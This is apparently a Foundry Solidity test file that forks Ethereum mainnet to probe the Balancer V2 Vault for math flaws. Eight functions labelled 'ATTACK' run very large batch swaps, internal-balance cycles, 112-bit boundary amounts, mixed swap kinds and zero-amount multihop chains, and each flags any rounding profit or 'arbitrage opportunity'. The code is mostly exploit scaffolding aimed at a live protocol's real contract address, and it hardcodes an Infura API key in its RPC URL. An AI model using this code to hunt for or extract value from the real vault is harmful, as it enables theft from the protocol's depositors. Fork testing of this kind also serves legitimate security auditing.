// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

// ============================================================================
// Balancer V2 Vault MATH EXPLOITATION
// Target: 0xBA12222222228d8Ba445958a75a0704d566BF2C8
//
// FOCUS: Massive sequences to break math
// - 100-200+ batch operations
// - Accumulated rounding errors
// - 112-bit balance overflow edge cases
// - Precision loss in repeated swaps
// - Fee calculation accumulation errors
// ============================================================================

interface IAsset {}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IVault {
    enum SwapKind { GIVEN_IN, GIVEN_OUT }
    enum UserBalanceOpKind { DEPOSIT_INTERNAL, WITHDRAW_INTERNAL, TRANSFER_INTERNAL, TRANSFER_EXTERNAL }

    struct BatchSwapStep {
        bytes32 poolId;
        uint256 assetInIndex;
        uint256 assetOutIndex;
        uint256 amount;
        bytes userData;
    }

    struct FundManagement {
        address sender;
        bool fromInternalBalance;
        address payable recipient;
        bool toInternalBalance;
    }

    struct UserBalanceOp {
        UserBalanceOpKind kind;
        IAsset asset;
        uint256 amount;
        address sender;
        address payable recipient;
    }

    function batchSwap(SwapKind kind, BatchSwapStep[] memory swaps, IAsset[] memory assets, FundManagement memory funds, int256[] memory limits, uint256 deadline) external payable returns (int256[] memory);
    function queryBatchSwap(SwapKind kind, BatchSwapStep[] memory swaps, IAsset[] memory assets, FundManagement memory funds) external returns (int256[] memory);
    function manageUserBalance(UserBalanceOp[] memory ops) external payable;
    function getInternalBalance(address user, IERC20[] memory tokens) external view returns (uint256[] memory);
    function getPoolTokens(bytes32 poolId) external view returns (IERC20[] memory tokens, uint256[] memory balances, uint256 lastChangeBlock);
    function WETH() external view returns (IWETH);
}

contract BalancerMathExploit is Test {
    IVault constant VAULT = IVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IAsset constant ETH = IAsset(address(0));

    IERC20 constant BAL = IERC20(0xba100000625a3754423978a60c9317c58a424e3D);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    // Pools for testing
    bytes32 constant BAL_WETH_POOL = 0x5c6ee304399dbdb9c8ef030ab642b10820db8f56000200000000000000000014;

    address attacker;

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
        attacker = address(this);
        vm.deal(attacker, 1000 ether);

        // Get WETH
        WETH.deposit{value: 500 ether}();
        WETH.approve(address(VAULT), type(uint256).max);
    }

    // ========================================================================
    // ATTACK 1: Massive Internal Balance Deposit/Withdraw Cycles
    // 200 operations to find rounding errors in internal balance
    // ========================================================================

    function test_MassiveInternalBalanceCycles() public {
        console.log("=== MASSIVE INTERNAL BALANCE CYCLES (200 ops) ===");

        uint256 startBalance = WETH.balanceOf(attacker);
        console.log("Starting WETH:", startBalance / 1e18);

        // Deposit all to internal
        IVault.UserBalanceOp[] memory depositOp = new IVault.UserBalanceOp[](1);
        depositOp[0] = IVault.UserBalanceOp({
            kind: IVault.UserBalanceOpKind.DEPOSIT_INTERNAL,
            asset: IAsset(address(WETH)),
            amount: 100 ether,
            sender: attacker,
            recipient: payable(attacker)
        });
        VAULT.manageUserBalance(depositOp);

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(WETH));

        uint256 initialInternal = VAULT.getInternalBalance(attacker, tokens)[0];
        console.log("Initial internal balance:", initialInternal / 1e18);

        // Create 200 small withdraw/deposit cycles with odd amounts
        // to try to accumulate rounding errors
        uint256 cycleAmount = 1; // 1 wei - smallest unit

        for (uint256 cycle = 0; cycle < 100; cycle++) {
            // Batch: withdraw 1 wei, deposit 1 wei
            IVault.UserBalanceOp[] memory ops = new IVault.UserBalanceOp[](2);

            ops[0] = IVault.UserBalanceOp({
                kind: IVault.UserBalanceOpKind.WITHDRAW_INTERNAL,
                asset: IAsset(address(WETH)),
                amount: cycleAmount,
                sender: attacker,
                recipient: payable(attacker)
            });

            ops[1] = IVault.UserBalanceOp({
                kind: IVault.UserBalanceOpKind.DEPOSIT_INTERNAL,
                asset: IAsset(address(WETH)),
                amount: cycleAmount,
                sender: attacker,
                recipient: payable(attacker)
            });

            try VAULT.manageUserBalance(ops) {
                // continue
            } catch {
                console.log("Failed at cycle:", cycle);
                break;
            }
        }

        uint256 finalInternal = VAULT.getInternalBalance(attacker, tokens)[0];
        console.log("Final internal balance:", finalInternal);
        console.log("Difference (wei):", finalInternal > initialInternal ? finalInternal - initialInternal : initialInternal - finalInternal);

        if (finalInternal != initialInternal) {
            console.log("!!! ROUNDING ERROR DETECTED !!!");
        }
    }

    // ========================================================================
    // ATTACK 2: Massive Batch Swap Round Trip
    // 200 swaps back and forth to accumulate fee rounding errors
    // ========================================================================

    function test_MassiveBatchSwapRoundTrip() public {
        console.log("=== MASSIVE BATCH SWAP ROUND TRIP (200 swaps) ===");

        // Get pool info
        (IERC20[] memory poolTokens, uint256[] memory poolBalances,) = VAULT.getPoolTokens(BAL_WETH_POOL);
        console.log("Pool BAL:", poolBalances[0] / 1e18);
        console.log("Pool WETH:", poolBalances[1] / 1e18);

        uint256 startWeth = WETH.balanceOf(attacker);
        uint256 startBal = BAL.balanceOf(attacker);
        console.log("Starting WETH:", startWeth / 1e18);
        console.log("Starting BAL:", startBal / 1e18);

        // Build massive batch: 100 round trips (200 swaps)
        // Each round trip: WETH->BAL, BAL->WETH
        uint256 numRoundTrips = 100;
        uint256 swapAmount = 0.001 ether; // Small amounts to test precision

        IVault.BatchSwapStep[] memory swaps = new IVault.BatchSwapStep[](numRoundTrips * 2);
        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        for (uint256 i = 0; i < numRoundTrips; i++) {
            // WETH -> BAL
            swaps[i * 2] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,  // WETH
                assetOutIndex: 0, // BAL
                amount: swapAmount,
                userData: ""
            });

            // BAL -> WETH (use previous output)
            swaps[i * 2 + 1] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 0,  // BAL
                assetOutIndex: 1, // WETH
                amount: 0,        // Use output from previous swap
                userData: ""
            });
        }

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // Set generous limits
        int256[] memory limits = new int256[](2);
        limits[0] = int256(100 ether);  // Allow some BAL delta
        limits[1] = int256(startWeth);  // Allow all WETH in

        console.log("Executing", numRoundTrips * 2, "swaps...");

        try VAULT.batchSwap(
            IVault.SwapKind.GIVEN_IN,
            swaps,
            assets,
            funds,
            limits,
            block.timestamp + 1000
        ) returns (int256[] memory deltas) {
            uint256 endWeth = WETH.balanceOf(attacker);
            uint256 endBal = BAL.balanceOf(attacker);

            console.log("Final WETH:", endWeth / 1e18);
            console.log("Final BAL:", endBal / 1e18);
            console.log("WETH delta (wei):", deltas[1] >= 0 ? uint256(deltas[1]) : uint256(-deltas[1]));
            console.log("BAL delta (wei):", deltas[0] >= 0 ? uint256(deltas[0]) : uint256(-deltas[0]));

            // Check for any unexpected gain
            if (endWeth > startWeth || endBal > startBal) {
                console.log("!!! PROFIT FROM ROUNDING !!!");
            }
        } catch Error(string memory reason) {
            console.log("Batch swap failed:", reason);
        } catch {
            console.log("Batch swap failed with unknown error");
        }
    }

    // ========================================================================
    // ATTACK 3: Edge Case Amounts - Test 112-bit Boundaries
    // The balance is stored in 112 bits (max 2^112 - 1)
    // ========================================================================

    function test_112BitBoundaryAmounts() public {
        console.log("=== 112-BIT BOUNDARY AMOUNTS ===");

        // Maximum 112-bit value
        uint256 max112 = (2**112) - 1;
        console.log("Max 112-bit value:", max112);
        console.log("Max 112-bit in ETH:", max112 / 1e18);

        // Try operations near the boundary
        uint256[] memory testAmounts = new uint256[](5);
        testAmounts[0] = max112;
        testAmounts[1] = max112 - 1;
        testAmounts[2] = max112 / 2;
        testAmounts[3] = (2**111);
        testAmounts[4] = uint256(2**112) / 3; // Non-power-of-2 division

        for (uint256 i = 0; i < testAmounts.length; i++) {
            console.log("\nTesting amount:", testAmounts[i] / 1e18, "ETH equivalent");

            // Query what would happen with this amount
            IAsset[] memory assets = new IAsset[](2);
            assets[0] = IAsset(address(BAL));
            assets[1] = IAsset(address(WETH));

            IVault.BatchSwapStep[] memory swaps = new IVault.BatchSwapStep[](1);
            swaps[0] = IVault.BatchSwapStep({
                poolId: BAL_WETH_POOL,
                assetInIndex: 1,
                assetOutIndex: 0,
                amount: testAmounts[i],
                userData: ""
            });

            IVault.FundManagement memory funds = IVault.FundManagement({
                sender: attacker,
                fromInternalBalance: false,
                recipient: payable(attacker),
                toInternalBalance: false
            });

            try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, swaps, assets, funds) returns (int256[] memory deltas) {
                console.log("  Query succeeded");
                console.log("  WETH in:", uint256(deltas[1]) / 1e18);
                console.log("  BAL out:", uint256(-deltas[0]) / 1e18);
            } catch Error(string memory reason) {
                console.log("  Query failed:", reason);
            } catch {
                console.log("  Query failed (low level)");
            }
        }
    }

    // ========================================================================
    // ATTACK 4: Precision Loss with Small Amounts
    // Repeated small swaps to find where precision is lost
    // ========================================================================

    function test_SmallAmountPrecisionLoss() public {
        console.log("=== SMALL AMOUNT PRECISION LOSS (1000 tiny swaps) ===");

        // Test with tiny amounts that might cause precision issues
        uint256[] memory tinyAmounts = new uint256[](6);
        tinyAmounts[0] = 1;           // 1 wei
        tinyAmounts[1] = 100;         // 100 wei
        tinyAmounts[2] = 1e9;         // 1 gwei
        tinyAmounts[3] = 1e12;        // 1000 gwei
        tinyAmounts[4] = 1e15;        // 0.001 ETH
        tinyAmounts[5] = 1e17;        // 0.1 ETH

        for (uint256 t = 0; t < tinyAmounts.length; t++) {
            uint256 swapAmount = tinyAmounts[t];
            console.log("\n--- Testing swap amount:", swapAmount, "wei ---");

            // Create batch of 50 identical swaps
            uint256 numSwaps = 50;
            IVault.BatchSwapStep[] memory swaps = new IVault.BatchSwapStep[](numSwaps);
            IAsset[] memory assets = new IAsset[](2);
            assets[0] = IAsset(address(BAL));
            assets[1] = IAsset(address(WETH));

            for (uint256 i = 0; i < numSwaps; i++) {
                swaps[i] = IVault.BatchSwapStep({
                    poolId: BAL_WETH_POOL,
                    assetInIndex: 1,
                    assetOutIndex: 0,
                    amount: swapAmount,
                    userData: ""
                });
            }

            IVault.FundManagement memory funds = IVault.FundManagement({
                sender: attacker,
                fromInternalBalance: false,
                recipient: payable(attacker),
                toInternalBalance: false
            });

            // Query the batch
            try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, swaps, assets, funds) returns (int256[] memory deltas) {
                uint256 totalWethIn = uint256(deltas[1]);
                uint256 totalBalOut = uint256(-deltas[0]);

                // Calculate expected vs actual
                uint256 expectedWethIn = swapAmount * numSwaps;

                console.log("  Total WETH in:", totalWethIn);
                console.log("  Expected WETH in:", expectedWethIn);
                console.log("  Total BAL out:", totalBalOut);

                if (totalWethIn != expectedWethIn) {
                    console.log("  !!! PRECISION DISCREPANCY !!!");
                    console.log("  Difference:", totalWethIn > expectedWethIn ? totalWethIn - expectedWethIn : expectedWethIn - totalWethIn);
                }

                // Check ratio consistency
                if (swapAmount > 0 && totalBalOut > 0) {
                    uint256 ratioPerSwap = totalBalOut / numSwaps;
                    uint256 remainder = totalBalOut % numSwaps;
                    console.log("  BAL per swap:", ratioPerSwap);
                    console.log("  Remainder:", remainder);
                }
            } catch {
                console.log("  Query failed");
            }
        }
    }

    // ========================================================================
    // ATTACK 5: ETH msg.value Precision in Massive Batch
    // 150 ETH deposit operations with varying amounts
    // ========================================================================

    function test_MassiveETHDepositPrecision() public {
        console.log("=== MASSIVE ETH DEPOSIT PRECISION (150 ops) ===");

        uint256 numOps = 150;
        uint256 amountPerOp = 1e15; // 0.001 ETH per op
        uint256 totalNeeded = numOps * amountPerOp;

        console.log("Ops:", numOps);
        console.log("Amount per op:", amountPerOp);
        console.log("Total ETH needed:", totalNeeded / 1e18);

        IVault.UserBalanceOp[] memory ops = new IVault.UserBalanceOp[](numOps);

        for (uint256 i = 0; i < numOps; i++) {
            ops[i] = IVault.UserBalanceOp({
                kind: IVault.UserBalanceOpKind.DEPOSIT_INTERNAL,
                asset: ETH,
                amount: amountPerOp,
                sender: attacker,
                recipient: payable(attacker)
            });
        }

        uint256 ethBefore = address(this).balance;
        uint256 wethBalBefore = WETH.balanceOf(attacker);

        console.log("ETH before:", ethBefore / 1e18);

        try VAULT.manageUserBalance{value: totalNeeded}(ops) {
            uint256 ethAfter = address(this).balance;
            console.log("ETH after:", ethAfter / 1e18);
            console.log("ETH spent:", (ethBefore - ethAfter) / 1e15, "* 0.001 ETH");

            IERC20[] memory tokens = new IERC20[](1);
            tokens[0] = IERC20(address(WETH));
            uint256 internalBalance = VAULT.getInternalBalance(attacker, tokens)[0];

            console.log("Internal WETH balance:", internalBalance);
            console.log("Expected:", totalNeeded);

            if (internalBalance != totalNeeded) {
                console.log("!!! PRECISION ERROR !!!");
                console.log("Difference:", internalBalance > totalNeeded ? internalBalance - totalNeeded : totalNeeded - internalBalance);
            }
        } catch Error(string memory reason) {
            console.log("Failed:", reason);
        }
    }

    // ========================================================================
    // ATTACK 6: Alternating GIVEN_IN / GIVEN_OUT Confusion
    // Mix swap kinds to find calculation inconsistencies
    // ========================================================================

    function test_GivenInOutAlternating() public {
        console.log("=== GIVEN_IN/GIVEN_OUT ALTERNATING ===");

        // First query GIVEN_IN
        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        uint256 swapAmount = 1 ether;

        IVault.BatchSwapStep[] memory swaps = new IVault.BatchSwapStep[](1);
        swaps[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 1,
            assetOutIndex: 0,
            amount: swapAmount,
            userData: ""
        });

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        // Query GIVEN_IN: we give 1 WETH, how much BAL do we get?
        int256[] memory deltasIn;
        try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, swaps, assets, funds) returns (int256[] memory d) {
            deltasIn = d;
            console.log("GIVEN_IN (1 WETH):");
            console.log("  WETH in:", uint256(deltasIn[1]) / 1e18);
            console.log("  BAL out:", uint256(-deltasIn[0]) / 1e18);
        } catch {
            console.log("GIVEN_IN query failed");
            return;
        }

        uint256 balReceived = uint256(-deltasIn[0]);

        // Now query GIVEN_OUT: we want to receive that exact BAL amount
        swaps[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 1,
            assetOutIndex: 0,
            amount: balReceived,
            userData: ""
        });

        int256[] memory deltasOut;
        try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_OUT, swaps, assets, funds) returns (int256[] memory d) {
            deltasOut = d;
            console.log("GIVEN_OUT (to get same BAL):");
            console.log("  WETH in:", uint256(deltasOut[1]) / 1e18);
            console.log("  BAL out:", uint256(-deltasOut[0]) / 1e18);
        } catch {
            console.log("GIVEN_OUT query failed");
            return;
        }

        // Compare - they should be equivalent (minus rounding)
        uint256 wethInGivenIn = uint256(deltasIn[1]);
        uint256 wethInGivenOut = uint256(deltasOut[1]);

        console.log("\nComparison:");
        console.log("WETH needed (GIVEN_IN):", wethInGivenIn);
        console.log("WETH needed (GIVEN_OUT):", wethInGivenOut);

        if (wethInGivenIn != wethInGivenOut) {
            uint256 diff = wethInGivenIn > wethInGivenOut ? wethInGivenIn - wethInGivenOut : wethInGivenOut - wethInGivenIn;
            console.log("Difference:", diff, "wei");

            if (diff > 0) {
                console.log("!!! ARBITRAGE OPPORTUNITY !!!");
            }
        }
    }

    // ========================================================================
    // ATTACK 7: Maximum Batch Size Stress Test
    // Push to the limit with maximum operations
    // ========================================================================

    function test_MaximumBatchSizeStress() public {
        console.log("=== MAXIMUM BATCH SIZE STRESS ===");

        // Try increasingly large batches
        uint256[] memory batchSizes = new uint256[](5);
        batchSizes[0] = 50;
        batchSizes[1] = 100;
        batchSizes[2] = 150;
        batchSizes[3] = 200;
        batchSizes[4] = 250;

        for (uint256 b = 0; b < batchSizes.length; b++) {
            uint256 size = batchSizes[b];
            console.log("\n--- Batch size:", size, "---");

            IVault.BatchSwapStep[] memory swaps = new IVault.BatchSwapStep[](size);
            IAsset[] memory assets = new IAsset[](2);
            assets[0] = IAsset(address(BAL));
            assets[1] = IAsset(address(WETH));

            uint256 swapAmount = 0.01 ether;

            for (uint256 i = 0; i < size; i++) {
                swaps[i] = IVault.BatchSwapStep({
                    poolId: BAL_WETH_POOL,
                    assetInIndex: 1,
                    assetOutIndex: 0,
                    amount: swapAmount,
                    userData: ""
                });
            }

            IVault.FundManagement memory funds = IVault.FundManagement({
                sender: attacker,
                fromInternalBalance: false,
                recipient: payable(attacker),
                toInternalBalance: false
            });

            uint256 gasBefore = gasleft();

            try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, swaps, assets, funds) returns (int256[] memory deltas) {
                uint256 gasUsed = gasBefore - gasleft();
                console.log("  Success, gas used:", gasUsed);
                console.log("  Total WETH in:", uint256(deltas[1]) / 1e18);
                console.log("  Total BAL out:", uint256(-deltas[0]) / 1e18);

                // Check linearity
                uint256 expectedWeth = swapAmount * size;
                if (uint256(deltas[1]) != expectedWeth) {
                    console.log("  !!! NON-LINEAR BEHAVIOR !!!");
                }
            } catch {
                console.log("  Failed at this batch size");
                break;
            }
        }
    }

    // ========================================================================
    // ATTACK 8: Repeated Zero Amount Swaps in Multihop
    // Test the amount=0 sentinel behavior extensively
    // ========================================================================

    function test_ZeroAmountMultihopChain() public {
        console.log("=== ZERO AMOUNT MULTIHOP CHAIN ===");

        // Start with explicit amount, then chain 50 zero-amount swaps
        uint256 chainLength = 51; // 1 explicit + 50 zeros

        IVault.BatchSwapStep[] memory swaps = new IVault.BatchSwapStep[](chainLength);
        IAsset[] memory assets = new IAsset[](2);
        assets[0] = IAsset(address(BAL));
        assets[1] = IAsset(address(WETH));

        // First swap: explicit 1 WETH -> BAL
        swaps[0] = IVault.BatchSwapStep({
            poolId: BAL_WETH_POOL,
            assetInIndex: 1,
            assetOutIndex: 0,
            amount: 1 ether,
            userData: ""
        });

        // Remaining swaps: alternate directions with amount=0
        for (uint256 i = 1; i < chainLength; i++) {
            if (i % 2 == 1) {
                // BAL -> WETH
                swaps[i] = IVault.BatchSwapStep({
                    poolId: BAL_WETH_POOL,
                    assetInIndex: 0,
                    assetOutIndex: 1,
                    amount: 0, // Use previous output
                    userData: ""
                });
            } else {
                // WETH -> BAL
                swaps[i] = IVault.BatchSwapStep({
                    poolId: BAL_WETH_POOL,
                    assetInIndex: 1,
                    assetOutIndex: 0,
                    amount: 0, // Use previous output
                    userData: ""
                });
            }
        }

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: attacker,
            fromInternalBalance: false,
            recipient: payable(attacker),
            toInternalBalance: false
        });

        console.log("Chain length:", chainLength);
        console.log("Initial WETH in: 1 ETH");

        try VAULT.queryBatchSwap(IVault.SwapKind.GIVEN_IN, swaps, assets, funds) returns (int256[] memory deltas) {
            console.log("Chain succeeded!");
            console.log("Final WETH delta:", deltas[1] >= 0 ? uint256(deltas[1]) : uint256(-deltas[1]));
            console.log("Final BAL delta:", deltas[0] >= 0 ? uint256(deltas[0]) : uint256(-deltas[0]));

            // After 50 round trips, we should have lost a lot to fees
            // But check if there's any gain
            if (deltas[1] < 0) {
                console.log("Net WETH out:", uint256(-deltas[1]) / 1e18);
            }
        } catch Error(string memory reason) {
            console.log("Chain failed:", reason);
        } catch {
            console.log("Chain failed (low level)");
        }
    }

    receive() external payable {}
}
